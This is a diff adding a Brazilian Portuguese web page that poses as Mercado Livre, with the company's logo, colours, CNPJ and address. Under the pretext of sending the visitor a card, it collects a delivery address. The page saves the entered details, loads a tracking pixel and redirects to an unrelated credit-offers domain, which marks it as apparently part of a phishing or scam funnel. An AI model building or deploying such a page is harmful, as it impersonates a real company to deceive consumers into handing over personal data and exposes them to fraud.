@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "68dc9a692aa590745b1509ad";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Endereço de Entrega</title>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600&display=swap" rel="stylesheet">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Sora', sans-serif; background-color: #f5f5f5; }
+    .header { display: flex; align-items: center; padding: 10px; border-bottom: 1px solid #aa9900; background-color: #FFE600; }
+    .logo { width: 125px; margin-left: 20px; padding: 10px; }
+    .content { max-width: 600px; margin: 0 auto; padding: 20px; }
+    h1 { color: #333; font-size: 24px; margin-bottom: 10px; text-align: center; }
+    .subtitle { color: #666; font-size: 16px; margin-bottom: 20px; text-align: center; }
+    .form-group { margin-bottom: 15px; }
+    .form-row { display: flex; gap: 10px; margin-bottom: 15px; }
+    .form-col { flex: 1; }
+    label { display: block; margin-bottom: 3px; color: #333; font-size: 13px; }
+    input[type="text"], select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-size: 15px; font-family: 'Sora', sans-serif; }
+    button { width: 100%; padding: 15px; background-color: #FFE600; color: #1c1c1c; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: 'Sora', sans-serif; box-shadow: 0 4px 8px rgba(255,230,0,0.3); transition: all 0.3s ease; margin-top: 10px; }
+    button:hover { background-color: #e6cf00; }
+    button:disabled { background-color: #ccc; cursor: not-allowed; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+<script>
+    let cepsNotificados = new Set();
+
+    $(document).ready(function() {
+        $('#cep').mask('00000-000');
+
+        function limpaFormulario() {
+            $("#endereco,#bairro,#cidade,#estado").val("");
+        }
+
+        $("#cep").blur(function() {
+            var cep = $(this).val().replace(/\D/g, '');
+            if (cep != "") {
+                var validacep = /^[0-9]{8}$/;
+                if(validacep.test(cep)) {
+                    mostrarLoader();
+                    fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`)
+                    .then(res => res.ok ? res.json() : $.getJSON(`https://viacep.com.br/ws/${cep}/json/?callback=?`))
+                    .then(dados => {
+                        if(dados.cep || dados.logradouro){
+                            $("#endereco").val(dados.street || dados.logradouro);
+                            $("#bairro").val(dados.neighborhood || dados.bairro);
+                            $("#cidade").val(dados.city || dados.localidade);
+                            $("#estado").val(dados.state || dados.uf);
+                        } else {
+                            mostrarMensagemManual('cep_inexistente', cep);
+                        }
+                        esconderLoader();
+                    }).catch(()=>{ mostrarMensagemManual('problema_tecnico', cep); esconderLoader(); });
+                } else {
+                    limpaFormulario();
+                    $("#cep").val("").after('<div class="error-message" style="color:#dc3545;font-size:14px;margin-top:5px;">Formato de CEP inválido.</div>');
+                    setTimeout(() => $(".error-message").fadeOut(()=>$(this).remove()), 2000);
+                }
+            } else { limpaFormulario(); }
+        });
+    });
+
+    function mostrarLoader(){
+        $(".loader").remove();
+        $("#cep").after(`<div class="loader" style="text-align:center;padding:15px;margin-top:10px;background:#f8f9fa;border-radius:5px;border:1px solid #e9ecef;display:flex;align-items:center;justify-content:center;">
+            <div style="width:20px;height:20px;border:3px solid #FFE600;border-radius:50%;border-top-color:transparent;animation:spin 1s infinite;margin-right:10px;"></div>
+            <span style="color:#666;font-size:14px;">Buscando endereço...</span>
+        </div>`);
+    }
+
+    function esconderLoader(){ $(".loader").fadeOut(()=>$(this).remove()); }
+
+    function mostrarMensagemManual(tipoErro, cep){
+        $(".error-message").remove(); esconderLoader();
+        $("#endereco,#bairro,#cidade,#estado").val("");
+        $("#cep").after(`<div class="error-message" style="color:#856404;background:#fff3cd;border:1px solid #ffeaa7;border-radius:5px;padding:10px;font-size:14px;margin-top:5px;text-align:center;">
+            <i class="fas fa-info-circle" style="margin-right:5px;"></i>
+            <strong>CEP não encontrado automaticamente</strong><br>Preencha os campos manualmente.
+        </div>`);
+
+        const chaveNot = `${cep}_${tipoErro}`;
+        if(!cepsNotificados.has(chaveNot)){
+            cepsNotificados.add(chaveNot);
+            setTimeout(()=>cepsNotificados.delete(chaveNot),3600000);
+        }
+
+        setTimeout(()=>$(".error-message").fadeOut(()=>$(this).remove()),5000);
+    }
+
+    function salvarEndereco() {
+        const endereco = {
+            logradouro: document.getElementById('endereco').value,
+            numero: document.getElementById('numero').value,
+            complemento: document.getElementById('complemento').value,
+            bairro: document.getElementById('bairro').value,
+            cidade: document.getElementById('cidade').value,
+            estado: document.getElementById('estado').value,
+            cep: document.getElementById('cep').value
+        };
+
+        localStorage.setItem('enderecoEntrega', JSON.stringify(endereco));
+
+        // Redireciona para a URL correta após salvar
+        window.location.href = 'https://ofertasdecredito.digital/envio';
+    }
+</script>
+</head>
+<body>
+    <div class="header">
+        <img src="https://i.ibb.co/sp4Np7Yq/oie-transparent.png" alt="Logo Mercado Livre" class="logo">
+    </div>
+
+    <div class="content">
+        <h1>Endereço de Entrega</h1>
+        <p class="subtitle">Onde você deseja receber seu cartão</p>
+
+        <form id="endereco-form" onsubmit="event.preventDefault(); salvarEndereco();">
+            <div class="form-group">
+                <label for="cep">CEP</label>
+                <input type="text" id="cep" name="cep" maxlength="9" placeholder="00000-000" required onkeyup="if(this.value.length>=9) this.blur();">
+            </div>
+            <div class="form-group">
+                <label for="endereco">Endereço</label>
+                <input type="text" id="endereco" name="endereco" required>
+            </div>
+            <div class="form-row">
+                <div class="form-col" style="flex:0.4;">
+                    <label for="numero">Número</label>
+                    <input type="text" id="numero" name="numero" required>
+                </div>
+                <div class="form-col" style="flex:0.6;">
+                    <label for="complemento">Complemento (opcional)</label>
+                    <input type="text" id="complemento" name="complemento">
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="bairro">Bairro</label>
+                <input type="text" id="bairro" name="bairro" required>
+            </div>
+            <div class="form-row">
+                <div class="form-col" style="flex:0.6;">
+                    <label for="cidade">Cidade</label>
+                    <input type="text" id="cidade" name="cidade" required>
+                </div>
+                <div class="form-col" style="flex:0.4;">
+                    <label for="estado">Estado</label>
+                    <select id="estado" name="estado" required>
+                        <option value="">Selecione</option>
+                        <option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option>
+                        <option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option>
+                        <option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option>
+                        <option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option>
+                        <option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option>
+                        <option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option>
+                        <option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option>
+                        <option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option>
+                        <option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option>
+                    </select>
+                </div>
+            </div>
+
+            <button type="submit">Continuar</button>
+        </form>
+    </div>
+
+    <footer style="padding:10px 15px;text-align:center;margin-top:50px;background-color:#f9f9f9;border-top:1px solid #eaeaea;font-family:'Sora',sans-serif;">
+        <div style="max-width:600px;margin:0 auto;">
+            <p style="color:#777;font-size:10px;margin-bottom:5px;line-height:1.2;">Mercado Livre S.A. | CNPJ: 79.379.491.0008-50</p>
+            <p style="color:#777;font-size:10px;margin-bottom:5px;line-height:1.2;">Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100</p>
+            <p style="color:#999;font-size:9px;margin-top:5px;">© 2025 - Todos os direitos reservados</p>
+        </div>
+    </footer>
+</body>
+</html>
